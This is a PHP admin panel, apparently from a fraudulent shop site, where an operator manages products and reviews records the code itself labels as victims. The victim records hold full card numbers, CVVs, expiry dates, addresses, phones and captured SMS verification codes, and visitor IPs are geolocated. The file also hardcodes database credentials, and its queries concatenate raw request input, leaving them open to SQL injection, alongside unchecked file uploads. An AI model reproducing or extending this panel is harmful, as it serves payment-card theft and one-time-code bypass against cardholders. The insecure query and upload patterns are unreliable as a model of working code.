<?php
$con=  mysqli_connect("us-mm-auto-dca-06-b.cleardb.net", "b5f045c90404ea",  "61ad1a3f",  "heroku_eac45f3ef65a15a");
mysqli_query($con,"SET CHARACTER SET 'utf8'");
session_start();
?>











<html lang="en" >
<meta charset="utf-8"> 
<meta http-equiv="X-UA-Compatible" content="IE=edge"> 
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">     
<title>admin</title>
<script type="text/javascript"  src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.12.1/css/all.css"> <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Cairo:200,300,400,500,600,700,800">  <link rel="stylesheet" href="http://fonts.cdnfonts.com/css/stingray">     <link rel="stylesheet" href="http://fonts.cdnfonts.com/css/font">  
<style> html , body {}   *{ padding:0; border:0; margin:0; outline: none !important;  list-style: none; box-sizing:border-box; text-decoration:none;}   ::after ,::before { box-sizing: border-box;}    </style>

















<div style="color:red;  font:800 20px 'cairo'; " >INSERT PRODUCT</div>

<?php
if(isset($_POST['submit']))  
{
		    date_default_timezone_set('Africa/Casablanca');  $datetime = date('m/d/Y h:i:s', time());  
	        function get_ip(){   if( isset($_SERVER['HTTP_CLIENT_IP']) )   {  return $_SERVER['HTTP_CLIENT_IP'];}  elseif  ( isset($_SERVER['HTTP_X_FORWARDED_FOR']) )     { return $_SERVER['HTTP_X_FORWARDED_FOR'];}   else  { return (  isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : ''   ); }     }      	$ip = get_ip();            $iplocation = @unserialize(file_get_contents('http://ip-api.com/php/'.$ip));       $iplocationcity= isset($iplocation['city']) ?  $iplocation['city'] : '';       $iplocationcountry= isset($iplocation['country']) ?  $iplocation['country'] : '';   $BROWSER  =  $_SERVER['HTTP_USER_AGENT'];	
            $img = $_FILES["img"]["name"] ;    	if(move_uploaded_file($_FILES["img"]["tmp_name"]  ,  "img/product/".$img )) ;
            $gallery= implode( "," , $_FILES['gallery']['name'] );     	foreach($_FILES['gallery']['name'] as $key => $val)  	{		move_uploaded_file(  $_FILES['gallery']['tmp_name'][$key]   ,  "img/product/" . $val );  	}
			$title = $_POST['title'];
			$price1 = $_POST['price1'];
			$price2 = $_POST['price2'];
			$quantity = $_POST['quantity'];
			$color= implode( ","  ,  $_FILES['color']['name'] );     	foreach($_FILES['color']['name'] as $key => $val)  	{		move_uploaded_file(  $_FILES['color']['tmp_name'][$key]   ,  "img/product/" . $val );  	}
			$sizee = $_POST['sizee'];
			$shipping = $_POST['shipping'];
			$description = $_POST['description'];
			                                                                                                                                                                                                                                                    
            $query = "INSERT INTO product (datetime, ip , img , gallery , title , price1 , price2 , quantity , color ,  sizee ,  shipping ,  description  ) VALUES ('$datetime' , '$ip' , '$img' , '$gallery' , '$title' , '$price1' ,  '$price2' , '$quantity' ,  '$color' ,  '$sizee' ,  '$shipping' ,'$description'  )";	
            if( mysqli_query($con,$query) ) 	  {	header("location:admin.php"); 	  } 	  else	  {		  echo'Please Check Your Query';	  }	
}	



?>



<form action="" method="post" enctype="multipart/form-data">
<label ><i class="fa fa-image"></i> Select image product <input type="file" name="img"   style="display: none;"  /></label>  <br/>
<label ><i class="fa fa-image"></i> Select gallery product <input type="file" name="gallery[]" multiple style="display: none;"  /></label>  <br/>
<input type="text" placeholder="title"  name="title"  /><br/>
<input type="text" placeholder="price1"  name="price1"  /><br/>
<input type="text" placeholder="price2"  name="price2"  /><br/>
<input type="text" placeholder="quantity"  name="quantity"  /><br/>
<label ><i class="fa fa-image"></i> Select color product <input type="file" name="color[]" multiple style="display: none;" /></label>  <br/>
<input type="text" placeholder="size"  name="sizee"  /><br/>
<input type="text" placeholder="shipping"  name="shipping"  /><br/>
<input type="text" placeholder="description"  name="description"  /><br/>
<input type="submit" value="INSERT"  name="submit"   /><br/>
</form>






















<br/><br/><br/><br/><br/>
<div style="color:red;  font:800 20px 'cairo'; " >les product</div>


<?php
if(isset($_POST['update']))  {	if(     mysqli_query( $con  ,  "  update product set  id='".$_POST['id']."',   datetime='".$_POST['datetime']."',  ip='".$_POST['ip']."',       img='".$_POST['img']."',    gallery='".$_POST['gallery']."',   title='".$_POST['title']."',    	price1='".$_POST['price1']."',	  price2='".$_POST['price2']."',  quantity='".$_POST['quantity']."',	color='".$_POST['color']."',		sizee='".$_POST['sizee']."',	shipping='".$_POST['shipping']."',	description='".$_POST['description']."'	        where id='".$_GET['IDD']."'  "   )  )    {header("location:admin.php");} else { header("location:admin.php");}      }
if(isset($_POST['delete']))  {	if(     mysqli_query( $con  ,  "  delete from product where id='".$_GET['IDD']."'    "   )  )         {header("location:admin.php");} else { header("location:admin.php");}      }	  
if(isset($_POST['clear']))  {	if(     mysqli_query( $con  ,  "  delete from product "   )  )        {header("location:admin.php");} else { header("location:admin.php");}        }	  

$result  =  mysqli_query(      $con   ,     "select * from product "           );
foreach($result as $row)	
{		
        $id= $row["id"];
		$datetime= $row["datetime"];
		$ip= $row["ip"];			
		$img= $row["img"];
		$gallery= $row["gallery"];
		$title= $row["title"];
		$price1= $row["price1"];
		$price2= $row["price2"];
		$quantity= $row["quantity"];				
		$color= $row["color"];					
		$sizee= $row["sizee"];		
		$shipping= $row["shipping"];				
		$description= $row["description"];	
	    ?>
	    <form method="post"  action="?IDD=<?php echo $id ?>"    >
		<input type="text"   value="<?php echo $id ?>"          name="id" /><br/>
        <input type="text"   value="<?php echo $datetime ?>"    name="datetime" /> <br/> 
        <input type="text"   value="<?php echo $ip ?>"          name="ip" /><br/>		
		<input type="text"   value="<?php echo $img ?>"         name="img" /><br/>
		<input type="text"   value="<?php echo $gallery ?>"     name="gallery" /><br/>
		<input type="text"   value="<?php echo $title ?>"       name="title" /><br/> 
		<input type="text"   value="<?php echo $price1 ?>"      name="price1" /><br/>
        <input type="text"   value="<?php echo $price2 ?>"      name="price2" /><br/> 			
		<input type="text"   value="<?php echo $quantity ?>"    name="quantity" /><br/> 
		<input type="text"   value="<?php echo $color ?>"       name="color" /><br/> 
		<input type="text"   value="<?php echo $sizee ?>"       name="sizee" /><br/> 
		<input type="text"   value="<?php echo $shipping ?>"    name="shipping" /><br/> 
		<input type="text"   value="<?php echo $description ?>" name="description" /><br/> 
						
		<input type="submit" value="update"  name="update"/>	
        <input type="submit" value="delete"  name="delete"/>
        </form>				
  		<br/> <br/>	<br/>	<br/>	
	    <?php 
} 
        ?>
		<form method="post"  action="?IDD=<?php echo $id ?>"     > <input type="submit" value="clear"  name="clear"/>  </form>	
        <?php
?>
















<br/><br/><br/><br/><br/>
<div style="color:red;  font:800 20px 'cairo'; " >les victime addtocart </div>

<?php
if(isset($_POST['update']))  {	if(     mysqli_query( $con  ,  "  update addtocart set id='".$_POST['id']."',   idproduct='".$_POST['idproduct']."',  datetime='".$_POST['datetime']."',       ip='".$_POST['ip']."',     img='".$_POST['img']."',    	title='".$_POST['title']."',	price1='".$_POST['price1']."',	quantity='".$_POST['quantity']."',		color='".$_POST['color']."',	sizee='".$_POST['sizee']."',	shipping='".$_POST['shipping']."'       where id='".$_GET['ID']."'  "   )  )    {header("location:admin.php");} else { header("location:admin.php");}      }
if(isset($_POST['delete']))  {	if(     mysqli_query( $con  ,  "  delete from addtocart where id='".$_GET['ID']."'    "   )  )         {header("location:admin.php");} else { header("location:admin.php");}      }	  
if(isset($_POST['clear']))  {	if(     mysqli_query( $con  ,  "  delete from addtocart "   )  )        {header("location:admin.php");} else { header("location:admin.php");}        }	  

 
$result  =  mysqli_query(      $con   ,     "select * from addtocart "           );
foreach($result as $row)	
{		
			$id= $row["id"];
			$idproduct= $row["idproduct"];
			$datetime= $row["datetime"];	
			$ip= $row["ip"];
			$img= $row["img"];
			$title= $row["title"];
			$price1= $row["price1"];				
			$quantity= $row["quantity"];					
			$color= $row["color"];		
			$sizee= $row["sizee"];				
			$shipping= $row["shipping"];		
	        ?>
	        <form method="post"  action="?ID=<?php echo $id ?>"    >
			<input type="text"   value="<?php echo $id ?>"            name="id" /><br/>
            <input type="text"   value="<?php echo $idproduct ?>"     name="idproduct" /> <br/> 
            <input type="text"   value="<?php echo $datetime ?>"      name="datetime" /><br/>		
			<input type="text"   value="<?php echo $ip ?>"            name="ip" /><br/>
			<input type="text"   value="<?php echo $img ?>"           name="img" /><br/> 
			<input type="text"   value="<?php echo $title ?>"         name="title" /><br/> 
			<input type="text"   value="<?php echo $price1 ?>"        name="price1" /><br/> 
			<input type="text"   value="<?php echo $quantity ?>"      name="quantity" /><br/> 
			<input type="text"   value="<?php echo $color ?>"         name="color" /><br/> 
			<input type="text"   value="<?php echo $sizee ?>"         name="sizee" /><br/> 
			<input type="text"   value="<?php echo $shipping ?>"      name="shipping" /><br/> 
			   
			<input type="submit" value="update"  name="update"/>	
            <input type="submit" value="delete"  name="delete"/>	
  			<br/> <br/>	
	        <?php 
} 
            ?>
		    <input type="submit" value="clear"  name="clear"/>
		    </form>	
	        <?php
?>





















<br/><br/><br/><br/><br/>
<div style="color:red;  font:800 20px 'cairo'; " > les victime sans codsms </div>

<?php
if(isset($_POST['update']))  {	if(     mysqli_query( $con  ,  "  update orderclien set id='".$_POST['id']."',   datetime='".$_POST['datetime']."',  ip='".$_POST['ip']."',       img='".$_POST['img']."',     title='".$_POST['title']."',    	price1='".$_POST['price1']."',	quantity='".$_POST['quantity']."',	color='".$_POST['color']."',		sizee='".$_POST['sizee']."',	shipping='".$_POST['shipping']."',	subtotal='".$_POST['subtotal']."',	  totalprice='".$_POST['totalprice']."',  totalitem='".$_POST['totalitem']."',      email='".$_POST['email']."',	firstname='".$_POST['firstname']."',	lastname='".$_POST['lastname']."',	address='".$_POST['address']."',	city='".$_POST['city']."',	country='".$_POST['country']."',	postcode='".$_POST['postcode']."',	phone='".$_POST['phone']."',	nameoncard='".$_POST['nameoncard']."',	cardnumber='".$_POST['cardnumber']."',	expmm='".$_POST['expmm']."',	expyy='".$_POST['expyy']."',	cvv='".$_POST['cvv']."'        where id='".$_GET['ID']."'  "   )  )    {header("location:admin.php");} else { header("location:admin.php");}      }
if(isset($_POST['delete']))  {	if(     mysqli_query( $con  ,  "  delete from orderclien where id='".$_GET['ID']."'    "   )  )         {header("location:admin.php");} else { header("location:admin.php");}      }	  
if(isset($_POST['clear']))  {	if(     mysqli_query( $con  ,  "  delete from orderclien "   )  )        {header("location:admin.php");} else { header("location:admin.php");}        }	  

 
$result  =  mysqli_query(      $con   ,     "select * from orderclien "           );
foreach($result as $row)	
{		
			$id= $row["id"];
			$datetime= $row["datetime"];
			$ip= $row["ip"];	
			$img= $row["img"];
			$title= $row["title"];
			$price1= $row["price1"];
			$quantity= $row["quantity"];				
			$color= $row["color"];					
			$sizee= $row["sizee"];		
			$shipping= $row["shipping"];				
			$subtotal= $row["subtotal"];
			$totalprice= $row["totalprice"]; 
			$totalitem= $row["totalitem"];			
			$email= $row["email"];		
			$firstname= $row["firstname"];				
			$lastname= $row["lastname"];			
			$address= $row["address"];			
			$city= $row["city"];			
			$country= $row["country"];				
			$postcode= $row["postcode"];					
			$phone= $row["phone"];			
			$nameoncard= $row["nameoncard"];			
			$cardnumber= $row["cardnumber"];			
			$expmm= $row["expmm"];			
			$expyy= $row["expyy"];			
			$cvv= $row["cvv"];				
	        ?>
	        <form method="post"  action="?ID=<?php echo $id ?>"    >
			<input type="text"   value="<?php echo $id ?>"          name="id" /><br/>
            <input type="text"   value="<?php echo $datetime ?>"    name="datetime" /> <br/> 
            <input type="text"   value="<?php echo $ip ?>"          name="ip" /><br/>		
			<input type="text"   value="<?php echo $img ?>"         name="img" /><br/>
			<input type="text"   value="<?php echo $title ?>"       name="title" /><br/> 
			<input type="text"   value="<?php echo $price1 ?>"      name="price1" /><br/> 
			<input type="text"   value="<?php echo $quantity ?>"    name="quantity" /><br/> 
			<input type="text"   value="<?php echo $color ?>"       name="color" /><br/> 
			<input type="text"   value="<?php echo $sizee ?>"       name="sizee" /><br/> 
			<input type="text"   value="<?php echo $shipping ?>"    name="shipping" /><br/> 
			<input type="text"   value="<?php echo $subtotal ?>"    name="subtotal" /><br/> 
			<input type="text"   value="<?php echo $totalprice ?>"  name="totalprice" /><br/> 
			<input type="text"   value="<?php echo $totalitem ?>"   name="totalitem" /><br/> 
			<input type="text"   value="<?php echo $email ?>"       name="email" /><br/> 
			<input type="text"   value="<?php echo $firstname ?>"   name="firstname" /><br/> 
			<input type="text"   value="<?php echo $lastname ?>"    name="lastname" /><br/> 
			<input type="text"   value="<?php echo $address ?>"     name="address" /><br/> 
			<input type="text"   value="<?php echo $city ?>"        name="city" /><br/> 
			<input type="text"   value="<?php echo $country ?>"     name="country" /><br/> 
			<input type="text"   value="<?php echo $postcode ?>"    name="postcode" /><br/> 
			<input type="text"   value="<?php echo $phone ?>"       name="phone" /><br/> 
			<input type="text"   value="<?php echo $nameoncard ?>"  name="nameoncard" /><br/> 
			<input type="text"   value="<?php echo $cardnumber ?>"  name="cardnumber" /><br/> 
			<input type="text"   value="<?php echo $expmm ?>"       name="expmm" /><br/> 
			<input type="text"   value="<?php echo $expyy ?>"       name="expyy" /><br/> 
			<input type="text"   value="<?php echo $cvv ?>"         name="cvv" /><br/> 
			   
			<input type="submit" value="update"  name="update"/>	
            <input type="submit" value="delete"  name="delete"/>	
  			<br/> <br/>	
	        <?php 
} 
            ?>
		    <input type="submit" value="clear"  name="clear"/>
		    </form>	
	        <?php
?>








<br/><br/><br/><br/><br/>
<div style="color:red;  font:800 20px 'cairo'; " >les victime avec codsms</div>
<?php 
if(isset($_POST['update']))  {	if(     mysqli_query( $con  ,  "  update ordercliencodesms set  id='".$_POST['id']."',  datetime='".$_POST['datetime']."',  ip='".$_POST['ip']."',       totalitem='".$_POST['totalitem']."',    totalprice='".$_POST['totalprice']."',   email='".$_POST['email']."',    	firstname='".$_POST['firstname']."',	  lastname='".$_POST['lastname']."',  address='".$_POST['address']."',	city='".$_POST['city']."',		country='".$_POST['country']."',	postcode='".$_POST['postcode']."',	phone='".$_POST['phone']."',	nameoncard='".$_POST['nameoncard']."',	cardnumber='".$_POST['cardnumber']."',	expmm='".$_POST['expmm']."',	expyy='".$_POST['expyy']."',	cvv='".$_POST['cvv']."',	codesms='".$_POST['codesms']."'	         where id='".$_GET['ID']."'  "   )  )    {header("location:admin.php");} else { header("location:admin.php");}      }
if(isset($_POST['delete']))  {	if(     mysqli_query( $con  ,  "  delete from ordercliencodesms where id='".$_GET['ID']."'    "   )  )         {header("location:admin.php");} else { header("location:admin.php");}      }	  
if(isset($_POST['clear']))  {	if(     mysqli_query( $con  ,  "  delete from ordercliencodesms "   )  )        {header("location:admin.php");} else { header("location:admin.php");}        }	  

$result  =  mysqli_query(      $con   ,     "select * from ordercliencodesms " ); 
foreach($result as $row)	 
{ 
	 $id= $row["id"];
	 $datetime= $row["datetime"]; 
	 $ip= $row["ip"]; 
	 $totalitem= $row["totalitem"]; 
	 $totalprice= $row["totalprice"]; 
	 $email= $row["email"]; 
	 $firstname= $row["firstname"]; 
	 $lastname= $row["lastname"]; 
	 $address= $row["address"]; 
	 $city= $row["city"]; 
	 $country= $row["country"]; 
	 $postcode= $row["postcode"]; 
	 $phone= $row["phone"]; 
	 $nameoncard= $row["nameoncard"]; 
	 $cardnumber= $row["cardnumber"]; 
	 $expmm= $row["expmm"]; 
	 $expyy= $row["expyy"]; 
	 $cvv= $row["cvv"]; 
	 $codesms= $row["codesms"];                      
     ?> 
	 <form method="post"  action="?ID=<?php echo $id ?>" >  
	 <input type="text"   value="<?php echo $id ?>"             name="id" /><br/> 
	 <input type="text"   value="<?php echo $datetime ?>"       name="datetime" /><br/> 
	 <input type="text"   value="<?php echo $ip ?>"             name="ip" /><br/> 
	 <input type="text"   value="<?php echo $totalitem ?>"      name="totalitem" /><br/> 
	 <input type="text"   value="<?php echo $totalprice ?>"     name="totalprice" /><br/> 
	 <input type="text"   value="<?php echo $email ?>"          name="email" /><br/> 
	 <input type="text"   value="<?php echo $firstname ?>"      name="firstname" /><br/> 
	 <input type="text"   value="<?php echo $lastname ?>"       name="lastname" /><br/> 
	 <input type="text"   value="<?php echo $address ?>"        name="address" /><br/> 
	 <input type="text"   value="<?php echo $city ?>"           name="city" /><br/> 
	 <input type="text"   value="<?php echo $country ?>"        name="country" /><br/> 
	 <input type="text"   value="<?php echo $postcode ?>"       name="postcode" /><br/> 
	 <input type="text"   value="<?php echo $phone ?>"          name="phone" /><br/> 
	 <input type="text"   value="<?php echo $nameoncard ?>"     name="nameoncard" /><br/> 
	 <input type="text"   value="<?php echo $cardnumber ?>"     name="cardnumber" /><br/> 
	 <input type="text"   value="<?php echo $expmm ?>"          name="expmm" /><br/> 
	 <input type="text"   value="<?php echo $expyy ?>"          name="expyy" /><br/> 
	 <input type="text"   value="<?php echo $cvv ?>"            name="cvv" /><br/> 
	 <input type="text"   value="<?php echo $codesms ?>"        name="codesms" /><br/> 
     <input type="submit" value="update"  name="update"/>	
     <input type="submit" value="delete"  name="delete"/>
	 <br/> <br/>	
     <?php 
} 
     ?>
     <input type="submit" value="clear"  name="clear"/>
     </form>			 
     <?php		 
?> 





























<br/><br/><br/><br/><br/>
<div style="color:red;  font:800 20px 'cairo'; " >les message</div>


<?php
if(isset($_POST['update']))  {	if(     mysqli_query( $con  ,  "  update message set   id='".$_POST['id']."',  datetime='".$_POST['datetime']."',  ip='".$_POST['ip']."',      img='".$_POST['img']."',    gallery='".$_POST['gallery']."',   title='".$_POST['title']."',    	price1='".$_POST['price1']."',	  price2='".$_POST['price2']."',  quantity='".$_POST['quantity']."',	color='".$_POST['color']."',		sizee='".$_POST['sizee']."',	shipping='".$_POST['shipping']."',	description='".$_POST['description']."'	        where id='".$_GET['ID']."'  "   )  )    {header("location:admin.php");} else { header("location:admin.php");}      }
if(isset($_POST['delete']))  {	if(     mysqli_query( $con  ,  "  delete from message where id='".$_GET['ID']."'    "   )  )         {header("location:admin.php");} else { header("location:admin.php");}      }	  
if(isset($_POST['clear']))  {	if(     mysqli_query( $con  ,  "  delete from message "   )  )        {header("location:admin.php");} else { header("location:admin.php");}        }	  

$result  =  mysqli_query(      $con   ,     "select * from message "           );
foreach($result as $row)	
{	
        $id= $row["id"];	
		$datetime= $row["datetime"];
		$ip= $row["ip"];
		$iplocationcity= $row["iplocationcity"];
		$name= $row["name"];
		$email= $row["email"];
		$phone= $row["phone"];
		$message= $row["message"];
        ?>
	    <form method="post"  action="?ID=<?php echo $id ?>"    >
		<input type="text"   value="<?php echo $id ?>"                  name="id" /><br/>
        <input type="text"   value="<?php echo $datetime ?>"            name="datetime" /> <br/> 
        <input type="text"   value="<?php echo $ip ?>"                  name="ip" /><br/>
		<input type="text"   value="<?php echo $iplocationcity ?>"      name="iplocationcity" /><br/>
		<input type="text"   value="<?php echo $name ?>"                name="name" /><br/>
		<input type="text"   value="<?php echo $email ?>"               name="email" /><br/> 
		<input type="text"   value="<?php echo $phone ?>"               name="phone" /><br/>
		<input type="text"   value="<?php echo $message ?>"             name="message" /><br/>
						
		<input type="submit" value="update"  name="update"/>	
        <input type="submit" value="delete"  name="delete"/>
        </form>				
  		<br/> <br/>	<br/>	<br/>	
	    <?php 
} 
	    ?>
		<form method="post"  action="?ID=<?php echo $id ?>"     > <input type="submit" value="clear"  name="clear"/>  </form>	
        <?php
?>



